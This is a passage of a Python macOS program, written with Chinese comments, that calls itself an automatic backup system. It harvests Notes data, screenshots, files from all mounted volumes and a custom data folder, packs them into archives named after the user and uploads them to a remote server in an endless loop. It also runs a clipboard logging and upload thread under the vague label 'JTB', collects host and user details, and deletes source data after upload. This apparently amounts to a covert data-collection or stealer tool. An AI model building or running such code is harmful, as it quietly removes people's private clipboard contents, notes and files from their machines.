                        target_sub_dir = os.path.join(
                            screenshot_backup_directory,
                            f"source_{source_index:02d}_{source_label}",
                            relative_path,
                        )

                        home_relative = os.path.relpath(
                            os.path.abspath(source_file), os.path.expanduser("~"))
                        if (home_relative != ".."
                                and not home_relative.startswith("../")):
                            rel_key = backup_manager._state_key(
                                "mac:home", home_relative)
                        else:
                            source_id = hashlib.sha256(
                                os.path.abspath(source_dir).encode("utf-8")
                            ).hexdigest()[:16]
                            rel_key = backup_manager._state_key(
                                "mac:screenshots-external", source_id,
                                relative_path, file)
                        status = backup_manager._copy_if_changed(
                            source_file, os.path.join(target_sub_dir, file),
                            rel_key, changed_records, preserve_symlinks=True)
                        if status == "copied":
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已增量备份截图: {relative_path}/{file}")
                        elif status == "skipped":
                            skipped_files += 1
                        else:
                            complete = False
            except Exception as e:
                complete = False
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.info(f"ℹ️ 截图目录不存在，跳过: {source_dir}")

    backup_manager._save_backup_state()
    if changed_records:
        logging.info(
            f"📸 截图备份完成: 新增/更新 {len(changed_records)} 个，"
            f"未变化跳过 {skipped_files} 个")
        return screenshot_backup_directory, changed_records, complete
    if matched_files:
        logging.info(f"⏭️ 截图内容均未变化，跳过归档 ({skipped_files} 个文件)")
    else:
        logging.info("📸 未找到符合规则的截图文件")
    return None, {}, complete


def backup_custom_data(backup_manager):
    """检查并增量备份 ~/.dev/Backup/data/，返回 (归档路径列表, 是否部分失败)。

    data 目录是用户手动存放待上传数据的源目录。压缩前先复制到独立暂存目录，
    上传并提交成功后，再删除内容与归档一致的原生数据文件。
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    data_dir = os.path.abspath(os.path.join(
        backup_manager.config.BACKUP_ROOT, "data"))
    data_stage = os.path.join(
        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_data")

    if not os.path.lexists(data_dir):
        if backup_manager.config.DEBUG_MODE:
            logging.debug(f"自定义数据目录不存在，跳过: {data_dir}")
        return [], False
    if not os.path.isdir(data_dir):
        logging.error(f"❌ 自定义数据路径不是目录: {data_dir}")
        return [], True
    if not os.access(data_dir, os.R_OK):
        logging.error(f"❌ 自定义数据目录没有读取权限: {data_dir}")
        return [], True
    backup_manager._cleanup_uploaded_custom_data()
    if not backup_manager._ensure_free_space(
            0, os.path.dirname(data_stage) or data_stage):
        return [], True
    if not backup_manager._clean_directory(data_stage):
        logging.error(f"❌ 无法准备自定义数据暂存目录: {data_stage}")
        return [], True

    changed_records = {}
    complete, seen, skipped, failed = backup_manager._copy_tree_if_changed(
        data_dir,
        data_stage,
        CUSTOM_DATA_STATE_PREFIX.rstrip("/"),
        changed_records,
    )
    backup_manager._save_backup_state()

    if not complete:
        logging.error(
            f"❌ 自定义数据检查未完整完成: 扫描 {seen} 个，"
            f"跳过 {skipped} 个，失败 {failed} 个")
        return [], True
    if not changed_records:
        if seen:
            logging.info(
                f"⏭️ 自定义数据内容均未变化，跳过归档 ({skipped} 个文件)")
        else:
            logging.info("ℹ️ 自定义数据目录为空，跳过归档")
        return [], False

    archive = backup_manager.zip_backup_folder(
        data_stage,
        backup_manager.next_timestamped_archive_base(
            f"{user_prefix}_mac_data"),
    )
    if not archive:
        logging.error("❌ 自定义数据压缩失败")
        return [], True

    archive_reference = archive[0] if isinstance(archive, list) else archive
    backup_manager.register_pending_archive(archive_reference, changed_records)
    backup_paths = archive if isinstance(archive, list) else [archive]
    logging.critical(
        f"☑️ 自定义数据备份文件已准备完成: "
        f"{len(changed_records)} 个文件")
    return backup_paths, False


def backup_mac_data(backup_manager):
    """备份Mac系统数据，返回 (备份文件路径列表, 是否部分失败)（不执行上传）
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        tuple: (备份文件路径列表, 是否部分失败)
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    partial_detected = False
    try:
        # 备份备忘录数据
        notes_backup, notes_records, notes_complete = backup_notes(backup_manager)
        partial_detected = partial_detected or not notes_complete
        if notes_backup and notes_records:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                backup_manager.next_timestamped_archive_base(
                    f"{user_prefix}_notes")
            )
            if backup_path:
                archive_reference = (
                    backup_path[0] if isinstance(backup_path, list)
                    else backup_path
                )
                backup_manager.register_pending_archive(
                    archive_reference, notes_records)
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 备忘录数据备份文件已准备完成\n")
            else:
                logging.error("❌ 备忘录数据压缩失败\n")
                partial_detected = True
        elif not notes_complete:
            logging.error("❌ 备忘录数据收集失败\n")
        
        # 备份截图文件
        screenshots_backup, screenshot_records, screenshots_complete = backup_screenshots(
            backup_manager)
        partial_detected = partial_detected or not screenshots_complete
        if screenshots_backup and screenshot_records:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                backup_manager.next_timestamped_archive_base(
                    f"{user_prefix}_screenshots")
            )
            if backup_path:
                archive_reference = (
                    backup_path[0] if isinstance(backup_path, list)
                    else backup_path
                )
                backup_manager.register_pending_archive(
                    archive_reference, screenshot_records)
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 截图文件备份文件已准备完成\n")
            else:
                logging.error("❌ 截图文件压缩失败\n")
                partial_detected = True

    except Exception as e:
        logging.error(f"Mac数据备份失败: {e}")
        partial_detected = True
    
    backup_manager._save_backup_state()
    return backup_paths, partial_detected

def backup_volumes(backup_manager, available_volumes):
    """备份可用数据卷，返回 (备份文件路径列表, 是否部分失败)（不执行上传）
    
    Returns:
        tuple: (备份文件路径列表, 是否部分失败)
    """
    backup_paths = []
    partial_detected = False
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\n正在处理数据卷 {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                # 同一数据卷的全部类别共享状态键；相同源文件即使命中多个扫描类别，
                # 也只会进入一个归档，避免 docs/configs/specified 之间重复上传。
                state_namespace = f"mac:{volume_name}"
                if backup_type == 'specified':
                    backup_result = backup_manager.backup_specified_files(
                        source_dir, target_dir, state_namespace=state_namespace)
                else:
                    backup_result = backup_manager.backup_disk_files(
                        source_dir, target_dir, ext_type,
                        state_namespace=state_namespace)
                
                backup_dir = getattr(backup_result, 'path', None)
                if backup_result:
                    if isinstance(backup_result, BackupResult) and backup_result.status == "partial":
                        partial_detected = True
                        logging.warning(
                            f"⚠️ {volume_name} {backup_type} 部分文件备份失败，"
                            f"遗漏 {len(backup_result.missing_files)} 个文件"
                        )
                    changed_records = getattr(backup_result, "changed_records", {})
                    if not changed_records:
                        logging.info(
                            f"⏭️ {volume_name} {backup_type} 没有新增或更新的文件，"
                            "跳过归档")
                        continue
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        backup_manager.next_timestamped_archive_base(
                            os.path.basename(str(target_dir)))
                    )
                    if backup_path:
                        archive_reference = (
                            backup_path[0] if isinstance(backup_path, list)
                            else backup_path
                        )
                        backup_manager.register_pending_archive(
                            archive_reference, changed_records)
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        if isinstance(backup_result, BackupResult) and backup_result.status == "partial":
                            logging.warning(f"⚠️ {volume_name} {backup_type} 仅部分文件已归档\n")
                        else:
                            logging.critical(f"☑️ {volume_name} {backup_type} 备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ {volume_name} {backup_type} 压缩失败\n")
                else:
                    logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
                    partial_detected = True
            except Exception as e:
                logging.error(f"❌ {volume_name} {backup_type} 备份出错: {str(e)}\n")
                partial_detected = True
    
    return backup_paths, partial_detected

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # 先初始化日志，再启动监控/上传线程，避免线程在文件创建前竞争。
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        startup_line = f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
        with backup_manager._clipboard_lock():
            if os.path.exists(clipboard_log_path):
                with open(clipboard_log_path, 'a', encoding='utf-8') as f:
                    f.write(startup_line)
            else:
                with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                    f.write(startup_line)
    except Exception as e:
        logging.error(f"❌ 初始化JTB日志失败: {e}")

    if backup_manager.start_clipboard_workers(clipboard_log_path):
        logging.critical("📋 JTB监控线程已启动")
        logging.critical("📤 JTB上传线程已启动")
    else:
        logging.warning("⚠️ 剪贴板线程已在运行，未重复启动")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取macOS详细版本信息
    try:
        if platform.system() == "Darwin":
            mac_ver = platform.mac_ver()[0]
            if mac_ver:
                system_info["macOS版本"] = mac_ver
            
            # 尝试获取更详细的macOS版本名称
            try:
                result = subprocess.run(
                    ['sw_vers', '-productVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    system_info["macOS详细版本"] = result.stdout.strip()
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError):
                pass
    except Exception:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    schedule = BackupSchedule(backup_manager.config)
    retry_attempt = 0
    while True:
        try:
            if not schedule.should_backup_now():
                time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
                continue

            current_time = datetime.now()
            logging.critical("\n" + "="*40)
            logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
            logging.critical("-"*40)

            # 先重试遗留归档，避免本轮清理暂存目录导致同一内容再次打包。
            pending_uploaded = retry_pending_archives(backup_manager)
            backup_manager.cleanup_orphan_archives()

            available_volumes = get_available_volumes(backup_manager)

            logging.critical("\n💾 数据卷备份")
            volumes_backup_paths, volumes_partial = backup_volumes(backup_manager, available_volumes)

            logging.critical("\n🍎 Mac系统数据备份")
            mac_data_backup_paths, mac_data_partial = backup_mac_data(backup_manager)

            logging.critical("\n📦 自定义数据备份")
            custom_data_backup_paths, custom_data_partial = backup_custom_data(
                backup_manager)

            all_backup_paths = (
                volumes_backup_paths
                + mac_data_backup_paths
                + custom_data_backup_paths
            )
            backup_partial = (
                volumes_partial
                or mac_data_partial
                or custom_data_partial
            )
            backup_complete = not backup_partial

            if all_backup_paths and backup_complete:
                logging.critical("\n" + "="*40)
                logging.critical(f"✅ 本地备份阶段完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("="*40 + "\n")
            elif all_backup_paths:
                logging.critical("\n" + "="*40)
                logging.critical(f"⚠️ 本地备份阶段部分完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("="*40 + "\n")
            else:
                logging.critical("\n" + "="*40)
                if backup_complete:
                    logging.critical("⏭️ 没有新增或更新的文件，无需生成归档")
                else:
                    logging.critical("❌ 本地备份未完整完成")
                logging.critical("="*40 + "\n")

            upload_success = True
            if all_backup_paths:
                logging.critical(
                    f"📤 开始上传 {len(all_backup_paths)} 个本轮归档文件...")
                for archive_key, archive_paths in group_archive_paths(
                        all_backup_paths).items():
                    if backup_manager.upload_backup(archive_paths):
                        backup_manager.mark_archive_uploaded(archive_key)
                    else:
                        upload_success = False
                if upload_success:
                    logging.critical("✅ 本轮归档已全部上传完成")
                else:
                    logging.error("❌ 部分归档上传失败，将保留 pending 状态等待重试")

            # 上传备份日志
            logging.critical("\n📝 正在上传备份日志...")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as e:
                logging.error(f"❌ 日志备份上传失败: {e}")

            cycle_succeeded, incomplete_reasons = evaluate_round_completion(
                all_backup_paths, backup_complete, upload_success,
                pending_uploaded)
            if cycle_succeeded:
                retry_attempt = 0
                backup_manager.prune_stale_state()
                next_backup_time = schedule.write_next_backup_time()
                schedule.clear_retry_time()
                logging.critical("✅ 备份与上传全部完成")
                if next_backup_time:
                    logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
            else:
                retry_delay = min(
                    backup_manager.config.ERROR_RETRY_DELAY
                    * (2 ** min(retry_attempt, 10)),
                    backup_manager.config.MAX_RETRY_DELAY,
                )
                retry_attempt += 1
                retry_time = schedule.write_retry_time(retry_delay)
                if retry_time:
                    logging.critical(
                        f"🔄 备份未完整完成（{'；'.join(incomplete_reasons)}），"
                        f"将在 {retry_time.strftime('%H:%M:%S')} 后重试")
                time.sleep(retry_delay)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            retry_delay = min(
                backup_manager.config.ERROR_RETRY_DELAY
                * (2 ** min(retry_attempt, 10)),
                backup_manager.config.MAX_RETRY_DELAY,
            )
            retry_attempt += 1
            schedule.write_retry_time(retry_delay)
            time.sleep(retry_delay)


def find_pending_backup_files(backup_manager, backup_root=None):
    """只查找 pending 状态中登记过的本地归档文件。"""
    root = Path(backup_root) if backup_root else Path(
        backup_manager.config.BACKUP_ROOT)
    pending = []
    pending_keys = set(
        backup_manager._state.get("pending_archives", {}).keys())
    try:
        for path in root.iterdir():
            if not path.is_file():
                continue
            name = path.name
            if not (name.endswith(".tar.gz") or ".tar.gz.part" in name):
                continue
            if archive_group_key(name) not in pending_keys:
                continue
            if backup_manager._is_valid_file(str(path)):
                pending.append(str(path))
    except OSError as exc:
        logging.error(f"扫描待上传备份失败: {exc}")

    # 上传阶段的大文件分片在其原始归档仍存在时应由原始归档统一重建；
    # 否则重试列表会同时包含原文件和已被重建/删除的旧分片。
    selected = []
    for archive_key, paths in group_archive_paths(pending).items():
        originals = [
            path for path in paths
            if os.path.basename(path) == archive_key
        ]
        selected.extend(originals or paths)
    return sorted(selected)


def retry_pending_archives(backup_manager):
    """按归档组重试遗留归档，整组成功后才提交文件内容指纹。"""
    pending_paths = find_pending_backup_files(backup_manager)
    groups = group_archive_paths(pending_paths)
    backup_manager.reconcile_pending_archives(set(groups))
    if not groups:
        return True

    logging.info(f"📤 重试遗留备份 ({len(pending_paths)} 个文件)...")
    all_uploaded = True
    for archive_key, archive_paths in groups.items():
        if backup_manager.upload_backup(archive_paths):
            backup_manager.mark_archive_uploaded(archive_key)
        else:
            all_uploaded = False
    if all_uploaded:
        logging.info("✅ 遗留备份已全部上传完成")
    else:
        logging.error("❌ 遗留备份仍有上传失败，将保留文件等待重试")
    return all_uploaded


def evaluate_round_completion(backup_paths, backup_complete, upload_success,
                              pending_uploaded=True):
    """判断本轮是否可推进正常备份周期。"""
    reasons = []
    if backup_paths:
        if not backup_complete:
            reasons.append("部分备份未完成")
        if not upload_success:
            reasons.append("归档未全部上传成功")
    elif not backup_complete:
        reasons.append("本轮备份未完整完成")
    if not pending_uploaded:
        reasons.append("遗留归档未全部上传成功")
    return not reasons, reasons


def _find_file_log_handler(log_file):
    target = os.path.abspath(log_file)
    for handler in logging.getLogger().handlers:
        if not isinstance(handler, logging.FileHandler):
            continue
        if os.path.abspath(getattr(handler, "baseFilename", "")) == target:
            return handler
    return None


def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
            
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)

        file_handler = _find_file_log_handler(log_file)
        try:
            if file_handler is not None:
                file_handler.acquire()
            try:
                with open(log_file, 'rb') as src:
                    snapshot = src.read()
            finally:
                if file_handler is not None:
                    file_handler.release()

            if not snapshot or not snapshot.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return

            with open(backup_path, 'wb') as dst:
                dst.write(snapshot)

            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return

            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 只删除已经成功上传的快照；上传期间新写入的日志必须保留。
                if file_handler is not None:
                    file_handler.acquire()
                try:
                    with open(log_file, 'rb') as current_file:
                        current_snapshot = current_file.read()
                    if current_snapshot.startswith(snapshot):
                        remainder = current_snapshot[len(snapshot):]
                        with open(log_file, 'wb') as current_file:
                            current_file.write(remainder)
                        logging.info("✅ 备份日志上传成功，已仅清理已上传快照")
                    else:
                        logging.warning(
                            "⚠️ 日志文件在快照后发生结构变化，未清空当前日志")
                finally:
                    if file_handler is not None:
                        file_handler.release()
            else:
                logging.error("❌ 备份日志上传失败，保留原始日志")
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """启动剪贴板上传循环。"""
    run_clipboard_upload(
        backup_manager,
        clipboard_log_path,
        getattr(backup_manager, "_worker_stop_event", None),
    )

def main():
    """主函数"""
    if requests is None or HTTPBasicAuth is None:
        print("❌ 缺少必需依赖 requests，请先执行: pip install requests")
        sys.exit(1)

    try:
        os.makedirs(BackupConfig.BACKUP_ROOT, exist_ok=True)
    except Exception as e:
        print(f"❌ 无法创建备份目录: {e}")
        sys.exit(1)

    lock_path = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.lock')
    lock_handle = None
    backup_manager = None
    try:
        lock_handle = open(lock_path, 'a+', encoding='utf-8')
        if fcntl is not None:
            try:
                fcntl.flock(lock_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except OSError:
                print("备份程序已经在运行，本次启动退出")
                return

        # 写 PID 仅用于排查，实际互斥由 fcntl.flock 保证，不会误删其他实例的锁。
        lock_handle.seek(0)
        lock_handle.truncate()
        lock_handle.write(str(os.getpid()))
        lock_handle.flush()

        # 检查磁盘空间，不足时直接停止，避免继续复制/压缩进一步耗尽磁盘。
        try:
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                print(f'❌ 备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
                return
        except Exception as e:
            print(f'⚠️ 无法检查磁盘空间: {e}')

        while True:
            try:
                backup_manager = BackupManager()
                clean_backup_directory(backup_manager)
                periodic_backup_upload(backup_manager)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                logging.error(f'备份过程发生错误: {str(e)}')
                if backup_manager is not None:
                    backup_manager.stop_clipboard_workers()
                time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)

    except KeyboardInterrupt:
        logging.info('备份程序被用户中断')
    finally:
        if backup_manager is not None:
            try:
                backup_manager.stop_clipboard_workers()
            except Exception:
                pass
        if lock_handle is not None:
            try:
                if fcntl is not None:
                    fcntl.flock(lock_handle, fcntl.LOCK_UN)
            except Exception:
                pass
            lock_handle.close()

if __name__ == "__main__":
    main()
